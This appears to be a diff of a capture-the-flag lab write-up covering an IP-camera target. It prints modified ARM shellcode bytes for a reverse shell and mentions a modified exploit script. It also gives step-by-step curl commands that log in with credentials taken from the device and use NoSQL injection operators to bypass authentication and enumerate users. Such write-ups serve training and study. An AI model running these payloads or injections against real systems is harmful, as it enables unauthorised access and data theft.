@@ -14,9 +14,8 @@
     
 -  [Part 2 - Modifying Assembly Code and Obtaining Reverse Shell](#part-2---modifying-assembly-code-and-obtaining-reverse-shell)
     
--  [Part 3 - Decrypting and Analysing WiFi Traffic](#part-3---decrypting-and-analysing-wifi-traffic)
+-  [Part 3 - Pivoting with NoSQLi ](#part-3---pivoting-with-nosqli)
     
--  [Part 4 - Decrypting and Replaying a RDP Session](#part-4---decrypting-and-replaying-a-rdp-session)
 
 
 
@@ -82,6 +81,7 @@ Let's have a look at port `50628` next - maybe we can access it through the brow
 
 ![Trivision Dashboard](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)
 
+#  
 
 ### Part 2 - Modifying Assembly Code and Obtaining Reverse Shell ###
 
@@ -153,22 +153,23 @@ push {r1}
 ```
 Now we can simply copy this set of instructions to the assembler and convert it to a hex string that we can paste into the Python Script:
 _(Make sure to select `ARM` for the processor type and to copy the Little Endian output)_
+
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/e90c2569-f13d-42d5-8eb3-3b0ecacc003c)
 
 You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230xf0++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230x34+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0xf0` and `#0x34` values to correspond to your IP address - but remember to avoid using any *bad characters*!
 
 So we can now update the python script with the new byte string we generated:
 ```
-"\xf0\x10\xa0\xe3\x01\x14\xa0\xe1\x34\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x04\x10\x2d\xe5"
+'\xf0\x10\xa0\xe3\x01\x14\xa0\xe1\x34\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x04\x10\x2d\xe5'
 ```
 
-[You may have a look at the update python code here](code/Snowy_ARMageddon/modified_exploit.py).
+[You may have a look at the updated python code here](code/Snowy_ARMageddon/modified_exploit.py).
 
-Just by running the `modified_exploit.py` we get a reverse shell connection to the IP Camera :)
+Just by running the `modified_exploit.py` we get a reverse shell connection to the IP Camera 😃
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/c407311b-5deb-4533-95e3-7cc1a944a6ea)
 
-Now that we're in we can have a look at the contents of the root folder and we can notice that thee is a hidden folder called `.emux`.
+Now that we're in we can have a look at the contents of the root folder and we can see that there is a hidden folder called `.emux`.
 
 ```
 $ ls -la
@@ -198,7 +199,7 @@ drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
 -rwxr-xr-x    1 root     root           169 Jan 16  2024 .nfs00000000000fa3a300000001
 ```
 
-The contents of the hidden file appear to be a bash script updating the contents of `/var/etc/umconfig.txt' with a new admin password.
+The contents of the hidden file appear to be a bash script updating `/var/etc/umconfig.txt` with a new password for user `admin`.
 ```
 $ cat .nfs00000000000fa3a300000001
 #!/bin/sh
@@ -217,7 +218,7 @@ TABLE=users
 
 ROW=0
 name=admin
-password=Y3*******r!ouspassword=admin
+password=Y3<R E D A C T E D>r!ouspassword=admin
 group=administrators
 prot=0
 disable=0
@@ -227,21 +228,20 @@ TABLE=groups
 ROW=0
 ...
 ...
-
 ```
+
 
 With this username / password combination in hand we can now head back to the browser and log in to the camera's web interface, where we are greeted by the first flag for this challenge.
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b9060a2e-bc9a-4221-be0a-fef6d4a222e7)
+#  
 
+### Part 3 - Pivoting with NoSQLi ###
 
-
-Now that we are on the inside of the work (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
+Now that we are on the inside of the network (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
 ```
-$ curl http://10.10.106.239:8080
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100   461  100   461    0     0   5971      0 --:--:-- --:--:-- --:--:--  6681
+$ curl -s http://10.10.106.239:8080
+
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>401 Unauthorized</title>
@@ -261,6 +261,7 @@ the credentials required.</p>
 We are served a page saying that the server is expecting us to supply credentials to access it, so perhaps we can try passing the credentials we just retrieved for the camera dashboard:
 ```
 curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
+
 <br />
 <b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
 <!DOCTYPE html>
@@ -274,7 +275,7 @@ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
   <link rel="stylesheet" href="styles.css" />
 </head>
 ```
-This still throws up an error, but if we add the `-L` switch to `curl` it wll follow website redirects and this time we get a different result:
+This still throws up an error, but if we add the `-L` switch to `curl` it will follow website redirects and this time we get a different result:
 ```
 $ curl -u 'admin:Y3<R E D A C T E D>d=admin' -s http://10.10.106.239:8080 -L
 
@@ -311,10 +312,9 @@ $ curl -u 'admin:Y3<R E D A C T E D>d=admin' -s http://10.10.106.239:8080 -L
               </div>
 ...
 ...
-...
 ```
 
-From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.106.239:8080/login.php` we are served with the exact page, so we now know where we were being redirected too and which page is expecting us to pass it a username and password 
+From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.106.239:8080/login.php` we are served with the exact smae page, so we now know where we were being redirected to and which page is expecting us to pass a username and password to it.
 
 Let's try and re-write our `curl` command to pass on our username and password to `login.php`.  We also add a `-c` switch to save any cookies served by the page:
 
@@ -329,7 +329,8 @@ This time we get a response telling us that the username or password are incorre
               </div>
 ```
 
-Well what to do next - we can send data to the server for processing but we don't seem to have the proper username and password that we need to use.  What followed here was a lot of trial and error and going round in circles until I decided to try some NoSQLi techniques - I used the following as a great refernce to get started: https://book.hacktricks.xyz/pentesting-web/nosql-injection
+Well... what do I try next? I can send data to the server for processing but I don't seem to have the proper username and password that I need to use.  
+What followed here was a lot of trial and error and going round in circles until I decided to try some NoSQLi techniques.  I used the following as a great refernce to get started: https://book.hacktricks.xyz/pentesting-web/nosql-injection
 
 The following `curl` command effictively matches to the first user in the database that has a non-null username and password:
 
@@ -337,14 +338,12 @@ The following `curl` command effictively matches to the first user in the databa
 $ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
 ```
 
-And it works!  we're now presented with a different HTML which includes the message **Welcome Frostbite**.
-
+And it works!  I'm now presented with a different HTML which includes the message **Welcome `Frostbite`!**.
 ``` 
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-800">
-
 ...
-
+...
     </div>
       </div>
     </nav>
@@ -355,10 +354,10 @@ And it works!  we're now presented with a different HTML which includes the mess
           <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frostbite!</h1>
                   </div>
       </header>
-
+...
 ...
 ```
-It would appear that the first username in the database is `Frostbite` but his dashboard is mostly empty and we have no useful information, so maybe we can start looking into what other usernames are available and what they have on their dashboard.
+It would appear that the first username in the database is `Frostbite` but their dashboard is mostly empty and we have no useful information, so maybe we can start looking into what other usernames are available and what they have on their dashboards.
 
 To do this I modified the `curl` command I used earlier to now exclude the username `Frostbite` and match on the next available one:
 
@@ -366,13 +365,13 @@ To do this I modified the `curl` command I used earlier to now exclude the usern
 curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
 ```
 
-This time we see the message **Welcome `Snowballer`**, but again not much else.  
+This time we see the message **Welcome `Snowballer`!**, but again not much else.  
 
-What comes next is a painstaking bit of repetitive trial and error which probably could have been automated but I would then have had to figure out how to break out of the shell on the IP camera or extablish some kind of proxy - which I couldn't be bothered with.
+What comes next is a painstaking bit of repetitive trial and error which probably could have been automated but I would then have had to figure out how to break out of the shell on the IP camera or establish some kind of proxy - which I really couldn't be bothered with.
 
-I kept adding each new username I found to the `curl` command as yet another name to be excluded.  To keep thigns more manageable I added the switch `-w 'Size: %{size_download}\n` to the command so that I could easily see if there was a significant change in the size of the retrieved data from one username to the next.  I also added a `| grep -e Welcome -e Size` so that for each new `curl` command I tried I would only get an output showing the Welcome message with the newly discovered username and the size of the retrieved data.
+I kept adding each new username I found to the `curl` command as yet another username to be excluded.  To keep things slightly more manageable I added the switch `-w 'Size: %{size_download}\n` to the command so that I could easily see if there was a significant change in the size of the retrieved data from one username to the next.  I also added a `| grep -e Welcome -e Size` so that for each new `curl` command I tried I would only get an output showing the Welcome message with the newly discovered username and the size of the retrieved data.
 
-Finally after 18 iterations of the `curl` command I enumarted the following usernames:
+Finally after 18 iterations of the `curl` command I enumerated the following usernames:
 ```
 Frostbite
 Snowballer
@@ -393,10 +392,10 @@ Grinchenko
 Snownandez
 Frosteau
 ```
-It was not possible to retrieve any further usernames, so I am assuming that this list is comprehensive, but nevertheless the `curl` request that returned `Frosteau` had a significantly larger file size - so that is most probably the user we should be looking at.
+
+It was not possible to retrieve any further usernames, so I am assuming that this list is comprehensive, but nevertheless the `curl` request that returned the last username; `Frosteau` had a significantly larger file size - so that is most probably the user we should be looking at anyway.
 
 The final curl command I used was:
-
 ```
 curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
 ```
@@ -407,18 +406,16 @@ Which gave me the following output:
 Size: 13899
 ```
 
-
-And now that we know that we're interested in retrieving `Frosteau`'s dashboard we can clean up this `curl` command to the following:
+And now that we know that we're interested in retrieving `Frosteau`'s dashboard we can clean up this `curl` command and shorten it to the following:
 ```
 curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
 ```
 
-Finally we are served `Frosteau`'s dashboard which - luckily for us - includes the contents of `yetikey2.txt` in cleartext in his 'Important Notes' section
-
+Finally we are served `Frosteau`'s dashboard which - luckily for us - includes the contents of `yetikey2.txt` in cleartext in his 'Important Notes' section:
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/2689690b-8ea5-4594-80c2-9e2e36f0a32e)
 
 I copied the html output and pasted it to a blank document on my local machine for a better-looking formatted output:
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b450a6e4-c0fe-41be-afeb-448e69629909)
 
-And right there at the bottom there is a list of usernames which took me oh so long to retrieve!  I wonder if there was a way of getting to that list earlier on!
+And right there at the bottom there is a list of usernames which took me oh-so-long to retrieve!  I wonder if there was a way of getting to that list earlier on!
